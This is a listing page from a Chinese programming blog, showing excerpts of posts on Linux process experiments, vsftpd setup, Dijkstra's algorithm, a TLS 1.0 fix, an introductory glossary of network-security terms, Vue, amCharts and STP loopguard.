	</header>
	<div class="content list__excerpt post__content clearfix">
		Unix/Linux操作系统分析实验二 内存分配与回收：Linux系统下利用链表实现动态内存分配 Unix/Linux操作系统分析实验三 文件操作算法： 实现在/proc目录下添加文件 Unix/Linux操作系统分析实验四 设备驱动： Linux系统下的字符设备驱动程序编程 本文章用于记录自己所学的内容，方便自己回顾复习。 实验内容 利用fork函数编写一个简单的多进程程序，用ps命令查看系统中进程的运行状况，并分析输出结果。在新创建的子进程中，使用exec类的函数启动另一程序的执行；分析多进程时系统的运行状态和输出结果；利用最常用的三个函数pthread_create，pthread_join和pthread_exit编写了一个最简单的多线程程序。理解多线程的运行和输出情况；利用信号量机制控制多线程的运行顺序，并实现多线程中数据的共享；分析Linux系统下多进程与多线程中的区别；编写程序实现进程的管道通信。用系统调用pipe( )建立一管道，二个子进程P1和P2分别向管道各写一句话： Child 1 is sending a message!
Child 2 is sending a message!
父进程从管道中读出二个来自子进程的信息并显示（要求先接收P1，后P2）。
7.编写一个HelloWorld内核模块，并进行装载和卸载操作。
实验步骤： 内容一：利用fork函数编写一个简单的多进程程序，最后使用ps命令查看系统中进程的运行状况。
PID：进程标识符 TTY：设备终端号 TIME：进程的运行时间 CMD：执行程序的参数和命令
分析输出结果：父进程调用fork系统调用函数来创建一个子进程，fork函数返回0时，说明子进程在执行；返回子进程的PID时，说明父进程在执行。
内容二：使用父进程调用fork()创建一个子进程，通过调用exec()来用新的程序（输出/bin/ls路径下的所有文件）代替子进程的内容，然后可以调用wait()来控制进程执行顺序，子进程输出/bin/ls路径下的所有文件，父进程输出语句ls complete !。
分析多进程时系统的运行状态和输出结果：
输入top命令查看系统运行状态和进程运行状态:
第一行说明：
top – ：系统当前时间
up：服务器连续运行的时间，笔者见过有服务器连续运行一年以上，linux服务器还是非常稳定的。
user：当前有多少用户登录系统
load average：这个边有3个数值分别表示系统在前1分钟，5分钟，15分钟的工作负载，根据笔者以往的经验来看单核负载在3-5之间比较合适，经常在1以下，说明cpu利用率不高，在5以上，cpu会处于较高负载状态，会容易宕机。有一次项目上线，晚上加班观察服务器状况，这个值长时间保持在72左右，因为服务器有八核，所以每核的值为9，后来服务器就挂了。
第二行就是显示任务的数量情况，其中zombie要注意一下，这个是表示僵尸进程，出现了僵尸进程要注意下僵尸进程是如何产生的。如果不找到产生原因，即使杀死了，可能也会再次出现。
第三行表示cpu的运行情况，按下1可以显示每个核的运行情况。
第四行表示内存memory的使用情况。
第五行表示交换空间swap的使用情况。
进程的运行状态，每个表头表示的含义如下：
PID：进程编号
USER：进程所属用户
PR/NI：Priority/Nice value进程执行的优先顺序
VIRT：Virtual Image (kb) 虚拟内存使用总额
RES：Resident size (kb) 常驻内存
SHR：Shared Mem size (kb) 共享内存
S：Process Status 进程状态
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f5d0a85b4819d02ee00f08779748db4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94b283acc74ad1bcec3207c9a732cac2/" rel="bookmark">
			Ubuntu搭建FTP服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、环境
二、安装软件
三、vsftp配置文件
四、权限设置
五、防火墙设置
六、Filezila设置
一、环境 本文搭建的ftp服务器是在Ubuntu20.04上搭建的vsftp服务器，运行在腾讯云上
二、安装软件 安装vsftp软件
sudo apt-get install vsftpd
设置成开机启动
sudo systemctl enable vsftpd
启动ftp服务
sudo systemctl start vsftpd 确认服务是否启动
sudo netstat -antup | grep ftp 此时，vsftpd 已默认开启匿名访问模式，无需通过用户名和密码即可登录 FTP 服务器。使用此方式登录 FTP 服务器的用户没有权修改或上传文件的权限。 三、vsftp配置文件 创建ftp用户，使用m参数，把ftp用户的home目录一起创建
sudo useradd -m ftpuser
设置ftp用户密码
sudo passwd ftpuser 创建 FTP 服务使用的文件目录，本文以 /home/ftpuser为例，创建用户时已经一起创建好
打开 vsftpd.conf 文件
sudo vim /etc/vsftpd.conf 修改以下配置参数，设置匿名用户和本地用户的登录权限，设置指定例外用户列表文件的路径，并开启监听 IPv4 sockets（创建vsftpd目录，安装的时候，可能没有创建该目录，直接安装到/var目录下了）
anonymous_enable=NO
local_enable=YES
chroot_local_user=YES
chroot_list_enable=YES
chroot_list_file=/etc/vsftpd/chroot_list
listen=YES write_enable=YES
在行首添加 #，注释 listen_ipv6=YES 配置参数，关闭监听 IPv6 sockets
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94b283acc74ad1bcec3207c9a732cac2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43f15b05febf623d032d45ca4d8df059/" rel="bookmark">
			Dijkstra最短路径算法详细过程附C&#43;&#43;详细代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.算法思想 将所有节点分为两组，一组节点是，从起点到该点的最短路径已经被确认，而另外一组是未被确定最短路径的节点。一开始，只有起点的最短路径被确认，并且为0，然后它遍历其他节点，并不断更新从起点到当前节点的最短路径。直到该点被访问后，则该点的最短路径被确定。
二.如下图所示，用Dijkstra算法找出节点O到T的最短路径
（1）首先初始化起点最短路径L(O)=0，剩下的点L(A)=L(B)=L(C)=L(D)=L(E)=L(F)=L(T)=∞；S是所有被遍历过的节点集合。U是当前被遍历的节点，W(Vi，Ui)表示两个节点的权值。
通过判断当前节点的最短路径加上到下一个节点的权值来确定下一个节点的最短路径，并不断迭代。
第一次迭代，U=O，和S={O}； L(O)+W(O,A)=2&lt;L(A);
L(O)+W(O,B)=5&lt;L(B);
L(O)+W(O,C)=4&lt;L(C);
更新上面3个点的最短路径：L（A）=2，L（B）=5,L(C)=4；
第二次迭代 U=A,S={O,A}
L(A)+W(A,B)=4&lt;L(B);
L(A)+W(A,F)=14&lt;L(F);
L(A)+W(A,D)=9&lt;L(D);
更新上面三个点的最短路径L（B）=4，L（F）=14,L(D)=9
第三次迭代U=B、S={O、A、B}
L(B)+W(B,D)=8&lt;L(D);
L(B)+W(B,E)=7&lt;L(E);
更新上述两点的最短路径 L(D)=8,L(E)=7;
第四次迭代U=C、S={O，A、B、C}
L(C)+W(C,E)=8&gt;L(E);
没有更新点。
第五次迭代U=D、S={O、A、B、C、D}
L(D)+W(D,T)=13&lt;L(T);
将最短路径更新到上面节点 L(T)=13；
第六次迭代U=E、S={O、A、B、C、D、E}
L(E)+W(E,T)=14&gt;L(T);
无更新点
第七次迭代U=F、S={O、A、B、C、D、E、F}
L(F)+W(F,T)=17&gt;L(T)
没有更新点。
第八次迭代，U=T、S={O、A、B、C、D、E、T}
从最短的O到T的没有更新点路径为13。
三，算法代码（C++实现）
#include&lt;iostream&gt; #include&lt;string&gt; using namespace std; class Node{ public: Node() { minL=100;//初始化最短路径为无穷大。 } char node;//节点名称 int minL;//当前节点的最短路径 Node* last;//下一个节点 };//定义从一个节点类 void print(Node *node)//最短路径函数的递归打印 { if (node == NULL) { return; } print(node-&gt;last);/*递归调用,先打印前面的节点*/ cout &lt;&lt; node-&gt;node &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43f15b05febf623d032d45ca4d8df059/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e18bcc9c8db59ff3316288660f174d8/" rel="bookmark">
			漏洞修复：TLS 1.0 enabled
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		其他组件扫描 AppScan 发现服务器支持较老的 TLS 版本（TLSv1.0 或 TLSv1.1）
描述 The web server supports encryption through TLS 1.0. TLS 1.0 is not considered to be "strong cryptography" as defined and required by the PCI Data Security Standard 3.2(.1) when used to protect sensitive information transferred to or from web sites. According to PCI, "30 June 2018 is the deadline for disabling SSL/early TLS and implementing a more secure encryption protocol – TLS 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e18bcc9c8db59ff3316288660f174d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80e950aa86b2b9f6775cfdff806bcdc6/" rel="bookmark">
			网络安全入门基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 网络安全常用术语 肉鸡 肉鸡指的就是被黑客成功入侵并取得控制权限的电脑。黑客们可以随意的控制肉鸡，就像在使用自己的电脑一样，很形象的比喻，就像是养的肉鸡，任黑客宰杀和利用。关键的是，在成为肉鸡后，只要黑客不对电脑进行破坏，使用者很难发现，有可能就是被养在哪里，随时都可能被使用。
后门 从字面意思就可以理解，前门有锁进不去，从后门悄悄潜入。这里指的是可以绕过安全软件等的防护，从一条比较隐蔽的通道获取对电脑的控制权限的通道，就叫做后门。黑客在入侵一台电脑成功后，很可能会再留下一个后门，将其发展成为肉鸡。
Shell Shell指的是一种命令执行环境，比如，Windows下的cmd就是其Shell执行环境。
WebShell WebShell就是以.asp、.php、.jsp或者.cgi等网页文件形式存在的一种命令执行环境，也可以将其称作是一种网页后门。
弱口令 这个相比都很熟悉了，注册账号的时候，我们输入123456，abcd等，网站就会在后面显示密码等级弱。这种非常简单的密码就叫做弱口令，弱口令通常很容易被黑客破解，用最低端的暴力算号器都能试出来
扫描 黑客会用一些工具来进行扫描，但用途则稍有不同，大多扫描的是IP、端口、漏洞等一切有利于入侵的信息。大概原理就是通过向目标计算机发送一些特定的请求，根据返回的信息来获取信息。
嗅探 嗅探指的是对局域网中流经的数据包进行截取及分析，从中获取有效信息，早期用HUB组建的局域网中属共享原理，数据是通过MAC地址来分辨目的地的，改变网卡为混杂模式，则就可以接受并分析数据包了。而现在大多用交换机组建局域网，交换机原理高级，数据直接发送至目标主机的网卡端口，所以大多采用ARP欺骗，修改MAC地址欺骗等方式来嗅探。
木马 木马指的是伪装成正常程序的的程序，它可以捆绑在任何正常的软件中，看起来让你感兴趣去打开，当运行后回在你的电脑上安装客户端或者执行特定的任务。之后黑客就能轻松地利用正在运行的木马程序来取得你的电脑控制权。
网页木马 网页木马指表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好木马的服务端下载到访问者的计算机上来自动执行。
挂马 挂马指在他人的网站文件中放入网页木马或是将代码潜入到对方正常的网页文件里，以使浏览者中马。
病毒 病毒大家都不陌生，指的就是具有破坏性的程序或者代码，电脑只要感染病毒后，即刻就会收到相应的破坏，病毒具有传染性、可不断复制，直接对电脑系统或者文件造成损坏。木马实际上也可以算病毒的一种。
加壳 加壳指给捆绑了木马的程序传一层马甲，进行压缩及代码加密，使得杀毒软件无法真实辨别出其恶意属性，特意绕过安全软件进入到电脑已达到目的。加壳也用于开发者对软件代码的保护等。脱壳指加壳的反向操作——去掉程序的壳。
花指令 花指令是指几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常地判断病毒文件的构造。通俗地说，就是杀毒软件是从头到脚按顺序来查找病毒，如果把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。
免杀 免杀是指通过加壳、加密、修改特征码、加花指令等技术来修改程序，使其逃过杀毒软件的查杀。
漏洞 人人都知道，又是一个很形象的比喻，漏指一个系统或软件存在的弱点或缺陷，来自应用设计时的缺陷或编码时产生的错误，而这些错误则会被黑客利用。现在我们使用的系统及软件，经常都会更新补丁及程序，目的就是为了修复发现的漏洞增加相应的防护及功能，确保更加安全。
溢出 确切地讲，溢出应该是"缓冲区溢出"。简单的解释就是程序对接收的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。溢出大致可以分为两类：堆溢出和栈溢出。
注入 由于程序员的水平参差不齐，相当大一部分应用程序存在安全隐患，用户可以提交一段数据库查询代码，根据程序返回的结果获得某些想要的数据，这就是SQL注入。
注入点 注入点是可以实行注入的地方，通常是一个访问数据库的连接。根据注入点数据库运行账号的权限的不同，所得到的权限也不同。
内网 通俗地讲，内网就是局域网。比如网吧、校园网、公司内部网等都属于此类。
如果计算机的IP地址在以下三个范围之内，就说明该计算机是处于内网之中的：
10.0.0.0~10.255.255.255
172.16.0.0~172.31.255.255
192.168.0.0~192.168.255.255
外网 外网是相对于内网而言，其中的计算机直接连入互联网，从而与互联网上的任意一台计算机互相访问。
认识进程与端口 认识系统进程 端口的分类 1.按端口号分布划分 公认端口
公认端口包括端口号范围是0~1023。它们紧密绑定于一些服务。通常，这些端口的通信明确表明了某种服务的协议，比如80端口分配给HTTP服务，21端口分配给FTP服务等。注册端口
注册端口端口号为1024~49151。它们松散地绑定于一些服务。也就是说，有许多服务绑定于这些端口，这些端口同样用于许多其他目的，比如许多系统处理动态端口从1024左右开始。动态或私有端口
动态或私有端口的端口号为49152~65535。理论上，不应为服务分配这些端口。但是一些木马和病毒就比较喜欢这样的端口，因为这些端口不易引起人们的注意，从而很容易屏蔽。 2.按协议类型划分 使用TCP协议的常见端口主要有如下几种：
HTTP协议端口
HTTP是用户使用的最多的协议，即"超文本传输协议"。当上网浏览网页时，就要在提供网页资源的计算机上打开80号端口以提供服务。WWW服务和Web服务器等使用的就是这个端口。FTP协议端口
FTP即文件传输协议，使用21端口。某计算机开了FTP服务，便启动了文件传输服务，下载文件和上传主页都要用到FTP服务。Telnet协议端口
该端口是一种用于远程登录的端口，用户可通过自己的身份远程连接到计算机上，通过这种端口可提供一种基于DOS模式的通信服务。如支持纯字符界面BBS的服务器会将23端口打开，以对外提供服务。SMTP协议端口
现在很多邮件服务器都使用这个简单邮件传送协议来发送邮件。如常见的免费邮件服务使用的就是此邮件服务端口，所以在电子邮件设置中经常会看到SMTP端口设置栏，服务器开放的是25号端口。POP3协议端口
POP3协议用于接收邮件，通常使用110端口。只要有使用POP3协议的程序（如Outlook等），就可以直接使用邮件程序收到邮件（如126邮箱用户就没有必要先进入126网站，再进入自己的邮箱来收信了。） 使用UDP协议的常见端口主要有如下几种：
DNS协议端口
DNS用于域名解析服务，这种服务在Windows NT系统中用得最多。Internet上的每一台计算机都有一个网络地址与之对应，这个地址就是IP地址，它以纯数字形式表示。但由于这种表示方法不便于记忆，于是就出现了域名，访问计算机时只需要知道域名即可。域名和IP地址之间的变换由DNS服务器来完成（DNS用的是53号端口）。SNMP协议端口
SNMP即简单网络管理协议，用来管理网络设备，使用161号端口。QQ协议端口
QQ程序即提供服务又接收服务，使用无连接协议，即UDP协议。
QQ服务器使用8000号端口侦听是否有信息到来，客户端使用4000号端口向外发送信息。 查看端口 netstat -a -n 常见的网络协议 IP协议 ARP协议 arp -a //查看ARP缓存表 ICMP协议 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a023c17372abc75320e32cdca87fb4e/" rel="bookmark">
			【VUE组件】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VUE组件 自定义组件 这里我们主要使用局部注册，首先需要在components文件夹中创建vue组件，且&lt;script&gt;中name即组件的名称：
然后在需要使用该组件的vue文件中执行：
在&lt;script&gt;中引入该组件；在&lt;compontents&gt;中注册该组件；在&lt;template&gt;中使用该组件； 另外需要注意的是：自定义组件的数据data必须是一个函数，重复使用的组件间的data是相互独立的。
data: function () { return { count: 0 } } 组件单向数据流 将父组件中的数据传入到子组件中去，这时候我们需要使用props属性，父子prop之间形成一个单向下行绑定：父级的prop的更新会流动到子组件中，反之则不行。
&lt;template&gt; &lt;div id="app"&gt; &lt;!-- 注意！title1 和 title2 是父组件的 data 中定义的数据，title 则是子组件中接收数据时的变量名 --&gt; &lt;HelloVue :title="title1"&gt;&lt;/HelloVue&gt; &lt;HelloVue :title="title2"&gt;&lt;/HelloVue&gt; &lt;/div&gt; &lt;/template&gt; 需要注意的是：在title前加冒号是因为后面的title1是一个变量，如果不加冒号，则认为后面的是一个字符串。
在子组件中使用props进行数据的接收，且props是一个数组：
&lt;template&gt; &lt;div class="hello"&gt; &lt;!-- 第二步：在页面上显示 title 的值，写法和显示 data 里定义的数据一样 --&gt; &lt;h1&gt;{{ title }}&lt;/h1&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: 'HelloVue', // 第一步：在 prop 属性中接收 title props: ['title'] }; &lt;/script&gt; 另外如果需要知道传入数据的数据类型，则需要这么使用（类型首字母大写）：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a023c17372abc75320e32cdca87fb4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c2f4e18cec3e16b5b97799433e606ce/" rel="bookmark">
			vscode python报错处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Backend Qt5Agg is interactive backend. Turning interactive mode on.
处理方式：
修改安装包内的配置文件为interactive:True
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0ffd746df0651a9330a1b87fd486a21/" rel="bookmark">
			数据可视化分析框架 amCharts 5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网文档amCharts 5 框架官网https://www.amcharts.com/ 下载安装 amCharts npm install @amcharts/amcharts5 在组件的脚本部分导入 amCharts 库 import * as am5 from '@amcharts/amcharts5'; import * as am5xy from '@amcharts/amcharts5/xy'; import am5themes_Animated from '@amcharts/amcharts5/themes/Animated'; amCharts 5 演示 &lt;template&gt; &lt;div class="manufacturingStateTestData"&gt; &lt;div class="mainlayout"&gt; &lt;div class="goBack poi flex0" @click="goBack" style="width: 200px"&gt; &lt;i class="el-icon-arrow-left b mr5"&gt;&lt;/i&gt;订单 &lt;span class="g5 n"&gt; -- 数据可视化分析 &lt;/span&gt; &lt;/div&gt; &lt;div class="bgf pl30 pr30 pt20 pb20" style="margin-top: 35px"&gt; &lt;div class="hikeen-handleBar"&gt; &lt;div ref="chartDiv" style="width: 100%;height: 600px"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import {pmsNewOrderApi} from "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0ffd746df0651a9330a1b87fd486a21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac74419581fbfdf7e41cfa50343f1e64/" rel="bookmark">
			STP生成树——安全特性——单向环路故障——loopguard技术详细讲解、网线分类（附图，建议PC观看）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
一、loopguard技术：
总结：
案列详解：
过程分析：
解决方案：
效果：
拓展：
网线分类：​
一、loopguard技术： 总结： 一般用于光纤接口，光纤接口出现单向故障，例如本地光纤接口发送方向出现单向故障，对端接口有阻塞状态变成转发状态形成的单项环路，为了避免这种情况产生启用此技术
接口下：spanning-tree guard loop
全局模式：spanning-tree loopguard default
---------------------------------------------------------------------------------------------------------------------------
案列详解： 过程分析： （在图中，根桥，指定端口，根端口、阻塞端口均已标注）
首先，假设在sw1上光纤的发送接口出现故障，就意味着sw2上的G0/2接口收不到来自sw1的BPDU，则生成树重收敛，使此时G0/2接口会由阻塞状态变为转发状态，则可能会形成单项环路，可能会引发二层广播风暴！（下图中红色箭头标注为单项环路）
解决方案： 1、在上下两个光接口上启用loopguard技术：接口下：spanning-tree guard loop
2、在所有的光接口上：全局模式：spanning-tree loopguard default
效果： 首先会去检测是否是一种单项环路故障，如果是则会把G0/2继续置为阻塞状态，防止单项环路故障。
---------------------------------------------------------------------------------------------------------------------------------
拓展： 网线分类： 以上仅个人观点，如有错误还请指出！欢迎留言讨论！感谢！ 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/263/">«</a>
	<span class="pagination__item pagination__item--current">264/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/265/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>